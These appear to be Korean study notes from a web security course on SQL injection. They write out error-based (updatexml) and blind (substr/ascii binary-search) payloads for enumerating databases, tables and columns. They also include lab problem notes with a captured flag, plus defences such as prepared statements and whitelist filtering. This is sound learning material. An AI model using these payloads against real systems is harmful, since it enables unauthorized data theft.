login by pass 3, 4의 마지막 결정적 힌트

식별 인증 분리되어 있고
sql문을 실행 > 패스워드 비교

DB에 평문 저장이 아님


---------------------------------

Error Based SQL Injection
> 에러 메시지를 이용한 SQL Injection
>> SQL 에러 메시지 (논리(로직에러))
>>> 실행

1' and updatexml(null, concat(0x3a, (SQL문)), null) and '1' = '1
> SQL문을 먼저 실행 후 updatexml을 실행함


했던 것들 순서들로 정리해두기


Blind SQL Injection
> 결과가 화면에 찍히지 않는 곳에서 사용

- 아이디 중복 체크

그럼 조건을 사용
> 응답 결과가 달라야함

중복체크의 문법은 
select id from member where id = $____ and ~~
로 되어 있을? 것이니 

1. 아이디' and '1' = '1
을 넣어서 확인을 먼저 해보자

아이디' and (1 = 1) and '1'='1
괄호 안의 조건에 따라 값이 다름




실무에선 가급적으로 주석 사용안함
코드가 어떻게 되어있을지 모르기에 쓰지않음
암묵적 규칙이구나



Blind SQLI 데이터를 하나하나 가져오는 것


2. select문을 사용할 수 있는지를 확인
1번의 조건에 같이 사용
아이디' and (select 'test'='test') and '1'='1
참 거짓 확인

참이 되면
아이디' and (select database()='test') and '1'='1
인데 확인 하기 위해선
substr()을 써야함

substr('데이터', 글자 위치, 출력할 글자 수)

substr('test', 1, 1) > t
>첫글자를 알려줌

substr('test', 1, 2) > te
>두번째 글자까지 알려줌

substr((select database()), 1, 1) = 'a'
니

substr((SQL문), 1, 1) ='a'

아이디' and substr((select database()), 1, 1='a') and '1'='1
이렇게 a~z까지 알아낸다


숫자면 조금 쉬움
up/down 으로

이진탐색기법

ascii() 함수로 아스키코드로 바꿔줌
그러니 substr()함수를 같이사용

ascii(substr(SQL문), 1, 1) > 50
아스키 코드로 바뀐 글자가 50보다 큰지 비교

즉
아이디' and (ascii(substr(select database()), 1, 1) > 50) and '1'='1
이렇게 반경을 줄여가며 한글자 씩 찾는다


DB를 알았다면

이제 테이블 이름을 알아야함. 
select 1, table_name, 3, 4 from information_schema.tables where table_schema = '얻은 데이터베이스 이름' limit 0, 1
을 써서 하나를 먼저 가져오고 비교함

' and (select count(*) 
       from information_schema.tables 
       where table_schema = database()) > 0 and '1'='1
이걸로 먼저 테이블이 있는지 확인이 가능


아이디' and (ascii(substr((select table_name from information_schema.tables where table_schema = '얻은 데이터베이스 이름' limit 0, 1), 1, 1)) > 50) and '1'='1



버프의 리피터로 조금 더 쉽게 볼 수 있음



아이디' and (ascii(substr((select column_name from information_schema.columns where table_name = '얻은 테이블 이름' limit 0, 1), 1, 1)) > 50) and '1'='1



select name from game limit 0, 1
gmae테이블의 name컬럼 의 처음꺼
OSS




concat 으로 글자를 합침. 컬럼도 가능
' union select concat(컬럼1, 컬럼2) from 테이블
구분이 안된다면
' union select concat(컬럼1, ':', 컬럼2) from 테이블
처럼 :으로 구분가능

group_concat은 여러행을 한번에 나오게 해줌
' union select group_concat(컬럼1, 컬럼2) from 테이블



자동화는 일단 당연히 이해를 해야함




SQL Injection 제일 어려운 것
> SQLI 포인트 찾기


SQLI가 일어나는 곳
> SQL문이 사용되는 곳
게시판, 회원가입, 아이디 중복체크, 비밀번호 변경 등등


찾고서 일단 항등원 넣기


SQLI 대응방안
preparedStatement
사용자의 파라미터가 SQL로 직접적으로 사용

코드의 문법은 안바뀌고 sqli로 '를 넣고 sql문을 추가해도 '가 있는 곳까지 넣는다.



preparedStatement사용시 빨라짐.


1. 안쓰는 곳이 있음
> 라이브러리나 옛날에 개발했거나

2. 쓰기는 하는데, 잘못사용함
select ~ where @='___'

3. preparedStatement 못쓰는 곳이 있음
> 테이블 이름, 컬럼 이름, 정렬 부분 등


화이트 리스트 기반 필터링



---------------------

1. preparedStatement
2. 화이트 리스트 기반 필터링

- 블랙리스트 기반의 필터링
> 우회기법이 있을 수 있음. 차선택


-----------------------------

SQLI는 select만 일어나는 것이 아님
intert, delete, update 등의 sql문에도 SQLI가 일어나 더 주의해야함.
주석 무조건 금지!



-----------------------------

과제

1. SQL Injection 기법 정리
기법 + 대응 방법 같이 정리해보기

2. SQLI 문제 풀이
blind sqli
substr(select ~~) 가 아니라
select substr(test, 1, 1) 이여도 되네
왠지 모르겠지만 select database()=blindsqli 은 참인데
테이블 이름을 얻으려고 db이름을 넣으면 안됨.

flagTable
flag

segfault{Congratz_firstBlindSqli}
sqli5
로그인과 같이 Error Syntax 순으로 진행
많음


sqli6
로그인과 같이 Error Syntax 순으로 진행


sqli point1
개인 정보에 user값을 변경시 낫띵이 변경되는 것을 확인
빈칸으로 두고 'union select database()' 으로 확인가능
마지막의 '은 ''로 되어 빈칸이라 출력이안되서 나오는 듯함

주석은 쓰면 안되지만 일단은 여기선 써봐서 union으로 남은 것들 찾기


sqli point2



sqli point3
글 검색시 ' 가 있으면 검색이 안됨


sqli point4
아이디에 따른 마이페이지에서 Syntax 문법 에러
> 왠지 모르지만 db까지만 가능 12/9
게시판에 제목이나 내용에 ' 추가시 문법에러 넣으니 권한알림나옴

Error Based SQL Injection으로



3. Login By Pass 정리

4. SQL Advanced 문제 풀이

5. 웹 개발
회원가입, 로그인, 변경, 게시판, 글쓰기, 검색, 수정, 삭제 등등